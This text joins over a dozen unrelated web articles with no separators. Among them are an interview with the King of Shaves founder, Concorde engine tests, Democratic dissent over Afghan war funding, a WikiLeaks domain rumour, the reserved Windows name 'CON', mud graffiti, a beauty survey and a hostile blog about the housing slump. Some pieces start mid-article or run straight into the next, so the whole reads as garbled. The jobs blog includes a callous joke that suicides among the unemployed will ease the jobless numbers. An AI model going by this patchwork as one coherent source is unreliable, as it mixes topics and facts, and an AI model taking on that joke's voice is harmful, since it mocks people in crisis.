Will King , founder of King of Shaves , talks to New Business about building a brand , why no firm should underestimate the power of the internet and how he is taking on the might of Gillette
Will King has built a business that is challenging the might of Gillette on a world scale .
He talks to New Business about how turned his business idea into a reality , what steps he took to grow the company and why no entrepreneur should underestimate the power of social media .
What is your business background ?
My first job was selling advertising space for a magazine and relatively quickly I was headhunted to work for a conference and production company .
I rose to business development director and then the 1990s recession hit .
The business did n't adapt quickly enough so I was made redundant - I was angry , as I was good at my job .
So I decided two things .
One was to be master of my own destiny and second was to make something , set up a company that produces products .
How did you come up with the idea for King of Shaves ?
I always used to get razor burn and rash , and my girlfriend had dry skin so had a number of oils in the bathroom .
I always used to complain about my razor and she said , ‘ Why do n't you shave using this oil underneath the shaving foam ? '
I did and did n't get razor burn .
It was as simple as if it works for me , then maybe it will work for other people .
What did you do next ?
I found out how to make oil to shave with and looked for manufacturers .
I came up with an oil blend , found a small contract manufacturer who would make the bulk of the oil and a bottle container company .
I managed to get into Harrods as I thought this would be the best store to launch in .
After I got Harrods I thought that I might be able to secure the interest of a big chain like Boots .
How did you initially fund the business ?
When I was made redundant a firm of management consultants were brought in , and a guy called Herbie Dayal - who ended up being my business partner - was one of the consultants and he was looking for a business to buy or invest in .
When I told him what I was thinking about doing he said if I set up the business he would consider investing a small amount of money if I got another investor , so I rang a friend of mine and told him about the project .
Between the two of them they put in just over £ 10,000 , my Mum and Dad put in £ 2,000 and I added £ 15,000 on credit cards and unsecured debt .
How hard was the first year of trading ?
Our first year losses were £ 30,000 and we had sales of £ 300 - not a stellar business investment .
But the following year sales jumped to £ 58,000 and a year later to £ 250,000 .
Because I used the product every day it was simply a question of how to get not just me shaving with it but thousands , then hundreds of thousands and then millions of people .
I never really doubted it would work because it worked for me every day and it had the potential to be a product that went from a niche usage into a mass usage .
You just had to go out and walk and walk , be persistent , passionate and believe in the product
What steps did you take to grow the company ?
I had to increase awareness of the brand , which I did by selling 10 % of the business for £ 10,000 in 1994 to fund a six month press and publicity campaign .
I found out that Will Carling the rugby player used the product and managed to sign him for a relatively small sum of money on a three - year endorsement .
I knew I had to get the product listed by the major multiples and I got Boots to eventually list it in 1994 .
Superdrug then trailed it and Tesco came on board in 1995 .
How hard was it to get the product stocked by the major retailers ?
To get them on board I worked personally in going out and seeing their buyer , explaining what I was doing , why there was a gap in the market and why oil was good to shave with .
You just had to go out and walk and walk , be persistent , passionate and believe in the product .
It was five years of what I call the valley of death , five years until I could pay myself any money .
How many years did you run the business by yourself ?
I ran it personally in a third bedroom when I moved in with my girlfriend to start off with .
I commandeered the bedroom and turned it into a micro office .
In 1995 I was juggling too much so I said to Herbie , ‘ you 've put your money in , we are growing the business but there are gaps starting to appear ' .
He said that he could join me but we would have to raise some more money .
We got a small firm loan guarantee scheme .
We managed to raise £ 100,000 on the scheme in 1995 and maxed this out to £ 250,000 over the following couple of years .
What did you spend the £ 100,000 loan money on ?
Almost all of it went on working capital , this requirement was quite big given that the business was growing and then it was spent on marketing .
I bought shave.com in 1995 and spent about £ 10,000 on the website .
I spent a lot of money on PR and got editorial coverage on a young , British based start - up company taking on the giant that is Gillette .
Does your marketing have to be innovative to compete with Gillete ?
Because we never had any money we had to be clever about what we did with what we had .
The internet is free and has had a huge effect on businesses and their ability to grow and to trim the cost lower and lower .
Twitter is free and people deride it , but the reality is that you get followers out there and friends of your brand .
You can communicate with them and they communicate with their friends : that is a very powerful brand message tool as it involves consumers talking to consumers about your product .
I have always looked for the new thing coming down the track and how to use that to my company 's advantage before you start to get charged a lot of money for it .
You have launched a razor - is this the future for your firm ?
Worldwide market size for blades is at $ 5 - 6 billion .
The shaving software is much smaller , $ 3-400 m .
So the business opportunity is in taking out King of Shaves razor and positioning it as like an Apple iPod or iPhone and launching that into the market .
What advice would you give to anyone thinking about starting their own business ?
Embrace the power of the internet .
The whole way we interact and view content is changing .
If you are going to start a business then embrace that change as a constant and remember that there are certain things that people will always need to do , it 's just how those products and brands will reach consumers that is going to change .

For seven hours last Saturday , engines from the supersonic airliner Concorde were tested and found to be in perfect condition , according to Ben Lord , the Vice Chairman of Save Concorde Group , a United Kingdom - based association of Concorde enthusiasts .
An approximately equivalent French group called Olympus 593 , arranged for the tests to be conducted at the Air and Space Museum just off the premises of the general aviation airfield ( IATA : LBG ; ICAO : LFPB ) in Le Bourget , a suburb of Paris .
The engines were taken from Sierra Delta , a former Air France Concorde .
Shortly after the engine tests , the Vice Chairman wrote , at the group 's website , www.save-concorde.org.uk, " I want to pay tribute to the fantastic workmanship that has taken place in France today with my British and French colleagues .
The Anglo - French effort is replicating history from 40 + years ago , and I am so proud of the work that each and every individual from the world of Concorde has done in recognition of their contribution today . "
The other engines from Sierra Delta will be similarly tested over the coming weeks .
As the Vice Chairman of Save Concorde Group points out , Concorde is , and for more than forty years has been , an Anglo - French project , resulting in the highest - profile and most popular supersonic commercial passenger transport vehicle ever .
Concorde flew frequent , regularly scheduled flights among only four airports in the world , Heathrow Airport in London ( IATA : LHR ; ICAO : EGLL ) , Charles de Gaulle International in Paris ( IATA : CDG ; ICAO : LFPG ) , Kennedy International in New York ( IATA : JFK ; ICAO : KJFK ) , and Dulles International in Washington , D.C. ( IATA : IAD ; ICAO : KIAD ) .
Concorde first flew in 1969 , and first carried paying passengers in 1976 .
The only blemish on Concorde 's safety record occurred in 2000 outside Paris , when one crashed into a Charles de Gaulle International airport hotel , killing all aboard , and four on the ground .
Rising maintenance costs were cited as one reason why Concorde was grounded three years later .
But it is sincerely hoped that Concorde will be fully functional in time to fly over the opening ceremonies in London , of the 2012 Summer Olympics .

As Afghan War Drags On , Some Democrats Threaten Revolt
Created : July 05 , 2010 06:00 | Last updated : July 31 , 2020 00:00
President Obama , addressing military families on Sunday at an Independence Day celebration , faces growing opposition to the Afghan war from within his own party .
( epa/ZUMApress.com )
The war in Afghanistan has produced divisions among Democrats in Congress from the start , but a series of votes on Thursday night revealed a rising tide of Democratic discontentment that could alter the trajectory of the Obama administration ’s approach to the conflict .
[ Security1 ]
A measure to fund the administration ’s 30,000 - troop surge with $ 33 billion narrowly passed late Thursday , by a 215 - 210 margin .
But the inclusion of domestic spending projects in the overall package appeared to boost its support among some Democrats , while a number of votes on amendments signaled a growing desire for an exit strategy .
“ The close vote shows the rising disagreements over war policy , ” said Darrell M. West , director of governance studies at the Brookings Institution .
“ The war has never been popular among Democratic activists and now lawmakers are starting to express their own doubts . ”
An amendment calling for a flexible withdrawal timetable — sponsored by Reps. David Obey ( D - Wis. ) , Jim McGovern ( D - Mass . ) and Walter Jones ( R - N.C. ) — failed to pass the House , but it won 162 votes , including those of 153 Democrats , three - fifths of the Democratic caucus .
McGovern hailed it as an “ important milestone ” in a statement released Friday .
“ This vote should send a signal to the Administration that Congress is increasingly troubled by risking the lives of our troops and borrowing hundreds of billions of dollars for ‘ nation - building ’ in Afghanistan while we are facing a dire economic situation here at home , ” he said .
“ I will continue to work to build bi-partisan support for a meaningful exit strategy from this war . ”
An amendment introduced Thursday by Rep. Barbara Lee ( D - Calif . ) proposed to restrict future war funding to troop redeployment and protecting soldiers presently in combat .
It received 100 votes , including those of 93 Democrats .
A third amendment to slash war funding entirely from the bill won the votes of 25 congressmen , including 22 Democrats , while an additional 22 Democrats chose not to oppose it and voted “ present . ”
“ Obviously , a lot of people are understandably anxious .
The sustainability of this war is in some doubt , ” said Michael O’Hanlon , a foreign policy expert at Brookings .
Antiwar sympathies seemed notably stronger than during a previous effort in the House to implement a withdrawal timetable , a motion in March by Rep. Dennis Kucinich ( D - Ohio ) that failed 365 - 65 .
Prior attempts have likewise been overwhelmingly defeated .
Speaking out most forcefully for limits to the war were the 23 members of the “ Out of Afghanistan Caucus , ” established by Rep. John Conyers ( D - Mich . ) on May 18 .
“ It ’s a fool ’s errand , ” said Rep. Jerrold Nadler ( D - N.Y. ) , one of the members , during a press conference Thursday .
“ Every dollar we spend in Afghanistan , every life we waste there , is a waste . …
What makes us think , what arrogance gives us the right to assume that we can succeed where the Moguls , the British , the Soviets , failed ? ”
Also on Thursday , Reps. Alan Grayson ( D - Fla. ) , John Conyers ( D - Mich . ) , Raul Grijalva ( D - Ariz . ) and Mike Honda ( D - Calif. ) took aim at President Obama for depicting the measure as urgent .
“ It is disingenuous to say this is an ‘ emergency ’ supplemental , ” they said in a joint statement .
“ The only emergency , ” they said , is that “ we are putting America further into debt ” by “ funding the longest war in history . ”
They added : “ Last year , President Obama pledged to stop these off - budget gimmicks to hide the cost of war . ”
West of Brookings noted that it ’s historically unusual for presidents to face challenges over war policy from within their own party .
“ Generally , members of your own party support your foreign policy , ” he said .
“ It ’s typical that you have to worry more about the opposition party than your own , and the fact that Democrats are expressing reservations should send a warning sign to the Obama administration . ”
This deepening fissure could turn into a headache for the president and Democratic leaders .
“ There ’s been a schism in the Democratic Party over all wars since Vietnam .
What matters is the intensity of it , ” said Eric Alterman , of the liberal Center for American Progress .
“ [ The antiwar coalition is ] going to make it more difficult for [ Obama ] to continue the war , and they ’re going to be a faction that has to be negotiated with . ”
“ But they ’re not going to cut him off at the knees , they ’re not to going to humiliate him , and they ’re not going to destroy his presidency over it , ” Alterman continued .
“ It ’s not going to be the kind of thing that tears the party apart , as this issue has done in the past , because people have learned those lessons . ”
O’Hanlon , a self - described Democrat and proponent of the Afghanistan occupation , cautioned that stripping funding now would cause Democrats to get “ pilloried by Republicans ” for “ being weak on defense . ”
“ It would be not only strategically unwise but politically suicidal , ” he said .
And while skeptical Democrats could play an important role in determining the eventual outcome of the war , they may not wield much influence over the administration ’s short - term strategy .
“ This group has influence in the broader sense because obviously it has put a stake in the ground , and if things continue to go badly in Afghanistan , its influence will grow , ” O’Hanlon said .
“ At some point it may be able to push the United States out of this conflict , but for now it ’s not going to have any direct impact on strategy . ”
Recent weeks and months have enhanced negative perceptions of the war , due to escalating violence , the ousting of Gen. Stanley McChrystal and charges of corruption by the government of Afghan President Hamid Karzai .
Polls suggest Americans are growing increasingly dissatisfied with the war .
The Obama administration has n’t flinched in its commitment to the effort , and has even begun to back away from its promise to begin winding America ’s involvement in the war next July .
“ That absolutely has not been decided , ” said Defense Secretary Robert Gates on June 20 on Fox News , nothing that withdrawal will be “ conditions - based . ”
Obama said on June 28 that there ’s “ a lot of obsession ” about the withdrawal date , which irritated some Democrats who perceived it as a snub .
It ’s unclear whether Democrats will accept the president ’s decision to extend it beyond then , if he chooses to .
“ I think a year from now all bets are off if we have n’t seen major progress , ” O’Hanlon said .
“ It ’s possible to imagine a revolt within the party in a year . ”

UPDATE 2:34 PM EST : WikiLeaks representative Daniel Schmitt told Geekosystem that he “ couldnt [ sic ] even imagine a reason ” why founder Julian Assange would be exiting from the website .
In his e-mail response , he warned against having “ fed the troll calling himself an insider , ” writing :
The .is domain registration was supposed to happen much earlier , and I am more or less astonished it has only now happened .
We control around 500 + domain names , and try to get wikileaks in as many TLDs as possible .
This is a normal action to occur , has nothing to do with us moving to Iceland or anywhere else .
WikiLeaks is as it is , and will stay the same , apart from a few changes and new features we have already publicly announced .
Re the legal team I am not aware of this issue .
As much as I can tell , though based in Europe and not a lawyer , our legal team is working on this and has so far not been able to get in touch with Manning .
According to Schmitt , a press release will be pending , a point reiterated on the WikiLeaks Twitter account : “ WikiLeaks will NOT be abandoned .
Do n’t listen to disinfo being spread !
We ’ll issue clarifications soon .
Should ’ve done earlier . ”
Read the original story after the break , in which an “ insider ” alleged that Wikileaks.org would be abandoned .
ORIGINAL STORY :
An insider source says that whistleblower site WikiLeaks.org is being deserted entirely , according to anti-secrecy site Cryptome .
Reclusive founder Julian Assange will reportedly no longer “ commit … time and effort into restoring our website , ” the tipster writes , and instead plans to launch an entirely new website based in Iceland , though only ostensibly .
The link used by WikiLeaks.org visitors to submit classified documents is currently down .
Supposedly , Assange did not offer any information regarding user options , facilities , or even a timeline for the new planned website .
Since the fateful arrest of 22 - year - old intelligence analyst PFC Bradley Manning , responsible for leaking the “ Collateral Murder ” video as well as over 260,000 classified U.S. diplomatic cables , WikiLeaks has suffered intense scrutiny from both the web and Pentagon officials alike .
Critics say the website –which publishes thousands of sensitive or classified documents –endangers national security , whereas supporters praise it as a bastion of free speech .
With the funding problems that have plagued WikiLeaks in the past year–notably , the site was suspended in late December “ to deal with a shortage of funds ” and only reinstated on May 19 – it ’s perhaps unsurprising that the whistleblowing initiative is closing shop .
Despite an e-mail sent by Assange requesting $ 50,000 in donations to pay off “ production costs ” and a legal team ’s travel costs , no lawyers have been provided for Manning on WikiLeaks ’ behalf and no representative has visited the leaker during his detention in Kuwait .
Just where did the money go ?
Over a week ago , insiders expressed concern on an encrypted board about Wikileaks ’ supposedly non-transparent accounting :
WIKILEAKS internal structure is becoming more of a closed shop than ever .
What really is beginning to concern us is the increasing lack of accounting for donations received from internet donors .
There is absolutely no accounting in terms of monies received and expenditures .
In addition to this , Assange is the only person with direct access to WIKILEAKS funds .
The lack of large donations is beginning to expose WIKILEAKS to undesirable political influence .
WIKILEAKS is receiving keep alive donations from the Movement Party in Iceland .
This is a small group of left wing politicians in the Icelandic parliament .
Sooner or later it will be payback time .
And payback will be in the form of political bias in WIKILEAKS output .
Our ( ACTIVISTS ) internal estimates put Assange ’s personal expenditure including business class air travel , accommodation and personal expenses at $ 52,000 from April 1st 2010 to July 1st 2010 .
So what is Assange , on the run from U.S. officials , doing behind the scenes ?
On July 7 , a new domain at WikiLeaks .
is surfaced , directing users to the WikiLeaks site and registered to an “ Antoine Croes ” from the Netherlands .
An attempt to reach him via phone was unsuccessful , but the name may merely be a privacy service front to protect the identity of the real domain owner .
A reverse IP lookup indicates that 15 other domains are hosted on the same web server as wikileaks .is , including sunshinepress.org and wikileaks.org ; this suggests the .is domain is in fact legitimately associated with the WikiLeaks groups .
A DNS check reveals that the domain is controlled by four name servers at intzix .
net .
Incoming mail for wikileaks .is processed by two mail servers also at intzix.net , with different IP networks : wikileaks .is has one number , but the reverse is host -88-80-2-32.cust.
prq.se , meaning that though the domain name suffix is Iceland - based , it is in fact hosted in Sweden .
Of course , with all the secretive information being whizzed about , it only makes sense that such cloaking techniques are used to confuse the servers ’ locations .
Is this merely a transition in WikiLeaks ’ publishing strategy , or an entirely new initiative ?
We have yet to see .
Geekosystem has asked WikiLeaks to comment , but at the time of this post ’s publication , we have yet to receive a reply .

Outline :
Message claims that not even Microsoft and Bill Gates can explain why it is impossible to create a folder named “ CON ” on a Windows based computer .
Brief Analysis :
It is true that you cannot create a folder called CON but the reason is well documented .
Example :
An Indian discovered that nobody can create a FOLDER anywhere on the computer which can be named as “ CON ” .
An Indian discovered that nobody can create a FOLDER anywhere on the computer which can be named as “ CON ” .
This is something pretty cool …and unbelievable …
At Microsoft the whole Team , including Bill Gates , could n’t answer why this happened !
TRY IT NOW !!
IT WILL NOT CREATE “ CON ” FOLDER ……. instead it will name it as new folder ….
TRY IT !!! ”
Detailed Analysis :
According to this rather breathless little message , which circulates via email and online , it is not possible to create a folder named “ CON ” on a Microsoft Windows based computer .
The message claims that not even Bill Gates or the whole Microsoft “ Team ” can explain why this might be so .
It is in fact perfectly true that you cannot create a folder named “ CON ” , nor can you rename an existing folder to “ CON ” .
However , there is no mystery surrounding this restriction whatsoever .
The “ team ” at Microsoft , and a great many others besides , know perfectly well why you cannot name a folder “ CON ” .
“ CON ” and a number of other character strings are in fact reserved names that go back to the days of DOS and cannot be used to name folders or files .
Other reserved names are :
PRN
AUX
NUL
LPT1
COM1
Potential drive letter – A : to Z :
A number of others
If you try to name a folder using one of these reserved names , the name will automatically revert to the default , generally “ New Folder ” .
Moreover , if you try to use a reserved name to name a file such as a Notepad or Microsoft Word document you will generally receive an error message similar to the following :
Depending on exactly how you save the file , you may instead receive a warning message advising that a file with that name already exists .
However , even if you choose “ Yes ” to overwrite the existing file , you will still not be allowed to save the file .
It should be noted that , by entering the right sequence of commands via the command prompt , it is usually possible to circumvent the restriction in Windows and create a folder using a reserved name .
However , this may cause other problems and is not advisable , especially for more inexperienced users .
While there is no mystery about this issue , it might have saved user confusion if Windows displayed an explanatory error message when attempting to create a folder with a reserved name as well .

Dirty Pictures
21 - year - old student Jesse Graves started putting up graffiti to promote environmental awareness nearly two years ago , and has never been harassed or arrested .
Many of his pieces remain intact on walls around the University of Wisconsin - Milwaukee campus .
If he had used spray paint , they would have been whitewashed by now .
But , he says , “ It would n’t make sense to use spray paint , because it ’s a toxic substance . ”
Instead , he used mud .
“ I started using mud because the material relates to the messages I ’m putting out there .
I ’m using earth , truly basic material — it ’s what sustains us — to express these environmental messages . ”
Dirt is a primary material in the primordial paintbox , but Graves is the first street artist to use it says Nicolas Lampert , his professor at UWM .
“ I follow street art very closely and I ’ve never seen it anywhere . ”
Not surprisingly , the mud Graves stenciled on sidewalks washed away with first rain .
He did n’t expect the wall stencils to last , but those he put up in 2007 “ look perfect today , ” Lampert says .
At first , Graves experimented with various mixtures of dirt and water until he came up with a mud “ the consistency of peanut butter . ”
He spread this over stencils made of mylar , workable but flimsy , and later , animal x-rays recycled from an animal hospital in his hometown of Madison , Wisconsin .
Recently , he used stencils made from roofing tarpaper .
“ I came up with that because my dad ’s a carpenter , I ’ve done some construction .
I ’m not a big fan of the tarpaper , it ’s kind of nasty stuff .
But it works best for the large scale ones . ”
In June , Graves and thirty volunteers used tarpaper to put up large scale mud stencils , some 9′ x 11′ , others 7 ′ x 9′ , in more than 40 locations around Chicago .
These featured an outline of the state of Illinois containing the message , “ End Torture In Illinois , ” and a star near the bottom labeled “ Tamms . ”
Graves had n’t used mud stencils to promote any cause besides environmentalism .
Lampert introduced him to Tamms Year Ten , a group advocating reform of Illinois ’ supermax prison , where inmates are remanded without due process and held in solitary confinement 23 - 7 ( the other hour is spent alone in an exercise “ yard , ” not much larger than the cells ) .
Graves was convinced by the testimony of prisoners on the Tamms Year Ten website .
Mud is a natural for environmental causes , but by itself has little to do with Tamms .
In Milwaukee , eco-friendly graffiti might be cop-friendly ( or at least cop-neutral ) and Graves has always approached the owners of the places he muds , but anti-Tamms mud graffiti in Chicago was another matter .
Tamms Year
Ten organizer Laurie Jo Reynolds says the responses she usually gets to the issue are “ ‘ they deserve what they get … ' ”
Before Graves arrived in Chicago , Reynolds consulted a lawyer about the potential legal consequences of putting dirt on the walls and sidewalk .
The lawyer compared it to “ building a snowman with snow . ”
“ Legally , it ’s a gray area , ” Graves says .
To Lampert , that ’s part of the appeal .
“ City governments do n’t know how to respond . ”
After a demonstration by Graves , the volunteers split up and fanned out across the city with stencils , buckets , sponges , and scrapers .
None were arrested or spoken to sharply .
Reynolds and three others stenciled at tourist attractions such as Navy Pier , the Chicago Board of Trade , and the Art Institute .
“ I was amazed at how receptive everybody was , ” she says .
“ They were delighted by the mud . ”
At least one person who saw the stencils was inspired to try spreading mud for a different cause .
Reynolds says the Executive Director of Rape Victim Advocates walked out of a conference at DePaul University , where there were mud stencils on the sidewalk and the walls , and contacted Reynolds for a demonstration .
“ She wants to use mud stencils for Rape Awareness month next April , and we are going to volunteer to show them how . ”
Graves is happy to share the mud stenciling method he came up with , and has posted instructions on how to go about creating them on his website , mudstencils.com .
“ I ’m trying to break down the negative connotations that people have with graffiti , ” he says .
“ A lot of people think that graffiti is about damaging property and it ’s a destructive act .
I see what I ’m doing as street art , it ’s about getting a message out there , and also about beautifying a space .
I do n’t want to look at an ugly gray wall in a place that I walk by every day .
I ’d rather look at something I consider beautiful . ”
Age 31 ...
Is this when a woman is at the peak of her appeal ?
With a £ 4 million ITV contract in her pocket and an engagement to her England footballer boyfriend rumoured to be imminent , it 's been a good year for Christine Bleakley .
Perhaps it 's no wonder , as the TV presenter is 31 , the age at which women are their most attractive , according to a survey .
Other celebrity women at the supposed perfect age are Strictly Come Dancing judge Alesha Dixon and model Kelly Brook .
Confident : At 31 , Christine Bleakley and Kelly Brook are at their most attractive
While the average British woman of 31 may be married with a child , the survey noted they are at a prime age because they have youthful beauty but also more confidence and a better sense of style than fresh - faced teenagers .
Some 70 per cent of more than 2,000 men and women polled cited confidence as a key factor in making a woman attractive , ahead of the 67 per cent who included physical beauty and 47 per cent who looked for a sense of style .
Youthful beauty : Strictly Come Dancing judge Alesha Dixon is also 31
Almost two thirds of women surveyed agreed with the proposition ' With age , comes beauty ' , and over half said that as they age they shed their insecurities and feel more beautiful , while 55 per cent felt they knew the best make - up to wear .
Self - confidence varied widely across the country in the survey : London women emerged as the most confident about their looks , with 37 per cent describing themselves as beautiful , compared with just 28 per cent of Welsh women .
Meanwhile , East Midlands women spend the most on beauty regimes - £ 129.69 monthly - compared with a national average of £ 105.50 .
The research was carried out for TV shopping channel QVC to mark the launch of its ' Beauty Month ' .
QVC marketing director Sue Leeson said : ' This research shows what many have always suspected - real beauty is about more than just good looks but a combination of confidence , style and personality too . '
Since former One Show host Miss Bleakley 's birthday in February , she has signed up to front ITV 's new breakfast line - up .
Meanwhile the Northern Irish presenter 's relationship with England and Chelsea midfielder Frank Lampard has become so serious that friends of the couple are predicting a proposal soon .
Hayden Panettiere Takes It Like A Champ
Featured 06/16/2010
The choreography is amazing , it must have taken months
They still do n't seem to get it :
It 's not really a recovery without jobs .
There was no recovery .
There was only the federal government propping up the banking industry , and it did n't really fool anybody :
After showing signs of a fledgling recovery from the worst downturn in decades , the U.S. housing market appears to be heading back toward the doldrums , as the expiration of a lucrative tax credit for buyers and increased uncertainty about the economy cause home sales to plummet .
The sudden weakness in residential real estate has struck nearly every region of the country , according to recent government and industry data , driving down sales of new and previously owned homes alike in May .
On Thursday , the National Association of Realtors said an index that measures sales contracts signed on existing homes plunged 30 percent in May , more than twice what analysts had forecast , to the lowest level since the group started tracking the numbers in 2001 .
Those sharp declines come despite record - low mortgage rates and historically cheap home prices .
The market 's renewed fragility highlights concerns about whether the U.S. economy will hurtle back into recession and illustrates the impact of the nation 's high unemployment rate , now at 9.7 percent .
On Friday , the government will issue jobless figures for June that could signal what is in store for housing and economic growth .
As long as people are without jobs or fear losing their livelihoods , they are unlikely to commit to buying a home and saddling themselves with 30 years of mortgage payments .
" It sounds simplistic but it bears repeating : ' No job = No house , ' " Mike Larson , an analyst with Weiss Research , wrote in a note to clients Thursday .
" With so many Americans unemployed or underemployed , the housing market is going to keep hurting . "
Gee , I wonder how much they pay Mike to come up with insights like that .
Is Weiss Research hiring , I wonder ?
And here 's more bad news -- or maybe " good " bad news , because the administration will find this hard to ignore :
Payrolls declined by 130,000 last month , according to the median estimate of 82 economists surveyed by Bloomberg News .
Private employment , which excludes government jobs , rose for a sixth consecutive month , the survey showed .
The pace of hiring signals it will take years for the world ’s largest economy to recover the more than 8 million jobs lost during the recession that began in December 2007 .
The turmoil in financial markets brought on by the European debt crisis raises the risk that employment will slow , depriving American households of the income needed to maintain spending .
I would n't worry .
After all , so many of the jobless are considering suicide , it should cut into the jobs - needed number considerably .
Dr. Bracken ’s assessment , which makes up 25 percent of a child ’s gifted score in the city , has been field tested for gender bias , and during a recent round of testing in Virginia , no gender differences in the score were recorded .
But the longer Otis-Lennon Ability Test , the other 75 percent of the gifted exam , is “ more verbal than some of the other tests , ” which could play to girls ’ strengths , said David F. Lohman , a professor and testing expert at the University of Iowa .
The city ’s Department of Education mandated the use of the two tests for admission to gifted programs beginning in 2008 ; before that , individual schools and districts each devised its own criteria .
These typically included a mix of standardized intelligence tests , interviews , observation and , for later grades , class work .
The additional leeway in admissions sometimes led to an effort to create gender balance in classes .
“ Up until about five years ago , there was more of a conscious effort to balance by gender , ” said Estelle Schmones , who retired last year as a gifted teacher at Public School 110 in Manhattan .
Like other educators and parents , Ms. Schmones noted that the number of girls in some gifted programs had been creeping up over the past several years .
David Cantor , the press secretary for the Education Department , said that any role the tests might play in contributing to the gender gap was not known , because the city did not tally the gender of those who took or passed the test , only those who enrolled in gifted classes .
Still , Mr. Cantor said , “ A good test for giftedness should be able to control for differences in what children have been exposed to , and for the early verbal development we see more often in girls . ”
Image Educators and experts have long known that boys lag behind girls in measures like high school graduation rates and college enrollment , but they are concerned that the disparity is also turning up at the very beginning of the school experience .
Credit ... Katie Orlinsky for The New York Times
The imbalance stands in contrast with the gender makeup of the eight high schools , including Stuyvesant High School , the Bronx High School of Science and Brooklyn Technical High School , that use the Specialized High Schools Admissions
Test to select students .
All have more boys than girls , in keeping with research that shows that boys tend to catch up with girls , especially in mathematics , through middle school and , at the high end of the achievement spectrum , surpass them .
( La Guardia High School , the prestigious school for music , art and the performing arts , has three girls for every boy . )
Whatever might be keeping young boys from entering gifted programs at equal rates might also be what can cause stumbles once they get in .
For some of the boys , “ their social and emotional development is not at the same level as their intellectual development , ” said Donna Taylor , the principal of the Brooklyn School of Inquiry .
She estimated that she spent about half her day helping her kindergarten and first - grade boys as they ran into trouble with issues like collaboration , self - control and sharing .
I do n’t know about you , but after watching the confirmation hearings for Supreme Court nominee Elena Kagan , I was given the distinct impression that Thurgood Marshall was being subjected to a criminal trial , post- mortem , by Republicans on the Senate Judiciary Committee .
The late , great Supreme Court justice – and the first African - American to sit on the high court – was mentioned no fewer than 35 times the first day .
Meanwhile , President Obama was mentioned only 14 times .
Elena Kagan has the nerve to actually admire such a man as Marshall , a civil rights giant who served as lead attorney in the Brown v. Board of Education case , and served as a jurist of high distinction .
She even served as a law clerk to the man .
How dare she !
Did n’t the White House people properly vet this candidate , so as to discover such disturbing , and potentially deal - breaking , information in her past ?
Each time a Supreme Court nominee comes before the Senate , we should expect the same thing : one group of lawmakers will ask thoughtful , probing questions in an attempt to determine the candidate ’s suitability for the nation ’s top judicial body .
But the other group , generally a contingent of dour white - male , pro-corporate , segregationist holdovers , are charged with the task of disrespecting any nominee that does not subscribe to their narrow and flawed worldview .
And it is this second group – which never passes up the opportunity to portray themselves as the twenty - first century reincarnation of Senators Strom Thurmond , Theodore Bilbo and James Eastland – that tells you all you need to know about the nature and purpose of these hearings .
And these Republicans spent valuable time sullying the name of a man who accomplished more for this country than they could ever dream in a thousand lifetimes , and whose shoes they are unworthy to fill collectively , much less shine .
Harsh words , perhaps , but the unsolicited commentary those senators provided that day was harsh , and was said in the presence of Justice Marshall ’s son .
The common theme was that liberal activist judges are evil , whatever “ activist ” means , with particular attention paid to Marshall ’s view that “ you do what you think is right and let the law catch up . ”
Sen. Jon Kyl ( R - Ariz . ) condemned Kagan for praising Marshall for believing that “ it was the role of the courts in interpreting the Constitution to protect the people who went unprotected by every other organ of gov ernment . ”
Kyl also said that Marshall ’s judicial philosophy “ is not what I would consider to be mainstream , ” and slammed Marshall for “ his unshakable determination to protect the underdog . ”
South Carolina Sen. Lindsey Graham said of Kagan ’s purported “ liberal ” political leanings , “ And if at the end of the day , you think more like Justice Marshall than Justice Rehnquist , so be it . ”
Well , one would hope that Kagan does not think like the late Chief Justice Rehnquist , who once defended the “ separate but equal ” doctrine in Plessy v. Ferguson , and began his legal career working for Operation Eagle Eye , a Republican project to intimidate , harass and exclude black and Latino voters .
He also fought the passage of a Phoenix , Arizona ordinance allowing blacks to enter stores and restaurants .
In his opening statement , Sen. Jeff Sessions ( R. , Ala . ) reminded us that Elena Kagan “ clerked for Judge [ Abner ] Mikva and Justice Marshall , each a well - known liberal activist judge . ”
Yes , she clerked for a Jew and a black , and we know what happens when you get those Jewish and black civil rights - loving activist types together .
Surely this thinly - veiled racist point was not missed by the Tea Party base for which Sessions ’ troubling message was intended , provided their mental capacity allowed them to catch it .
And Sessions is not one to be in judgment of anyone , yet he remains on the Senate Judiciary committee .
This is the man who was rejected by the Senate for the federal bench because he opposed the Voting Rights Act .
As a U.S. attorney in Alabama , he called a black assistant U.S. Attorney “ boy ” and warned him to “ be careful what you say to white folks . ”
He said the NAACP and the ACLU were “ un- American and Communist inspired ” groups that “ forced civil rights down the throats of people . ”
As a federal prosecutor , Sessions engaged in a voter - fraud witch - hunt against three Black civil rights workers , including a former aide to Dr. King .
Moreover , during a 1981 KKK murder investigation , Sessions was heard by several colleagues commenting that he “ used to think they [ the Klan ] were OK ” until he found out some of them were “ pot smokers . ”
Race was a fixture of the Sonia Sotomayor hearings , and apparently race is a big part of the Kagan hearings , even though Kagan is not a person of color .
That ’s because the ultra-Right Republicans ca n’t let it go .
Race - baiting is their crack , if you will , and they refuse to get treatment for their affliction .
The race card won them many an election .
And though their base of good ol ’ boys is dwindling , they refuse to divest themselves of a strategy that is doomed to failure in light of changing demographics .
The Kagan hearings , or any Supreme Court hearings for that matter , are part of the war to win over the hearts and minds of America , to determine what kind of country we want this to become .
Conservatives will decry the rise of the liberal activist judges who legislate from the bench .
But activism is in the eye of the beholder .
I cannot think of any greater examples of activism than the gems promulgated by the current court , such as the Citizens United decision , which gives corporations free rein to influence the political process .
And another great example is the court ’s new interpretation of Second Amendment , in which the language regarding “ a well regulated militia ” is misconstrued as a fundamental right of personal gun ownership under federal and state and local law .
This , in a nation with 30,000 gun murders a year .
In the end , the real question is whether we want the Dred Scott court and the Plessy court , or the court that gave us the Brown decision .
It ’s for the people with power or its power for the people .
And that ’s what these hearings are all about .

Part of an ongoing series on the environmental impacts of the Gulf oil spill .
Standing on a white - sand beach at Florida 's Gulf Islands National Seashore Thursday , blotchy stains from the Gulf oil spill could be seen creeping past the red-lettered " keep out " signs meant to protect nesting shorebirds .
And , according to conservationists , some well - meaning cleanup crews who unknowingly walk into nesting habitat may be doing more harm than the oil itself , experts say .
From April to August each year , rare shorebirds such as the snowy plover and least tern lay nests of two to three eggs directly on the softly undulating , open dunes about 40 feet ( 13 meters ) from the water 's edge .
Snowy plovers and least terns are considered threatened in Florida .
When nesting , both species ' survival depends on limited contact with people .
But with oil encroaching on Florida 's coasts , an army of cleanup crews has descended on the seashore .
About 44,300 people are now de-oiling roughly 450 miles ( 720 kilometers ) of Gulf coastline , according to the website for the Deepwater Horizon Unified Command , the joint federal - industry task force responding to the Gulf oil spill .
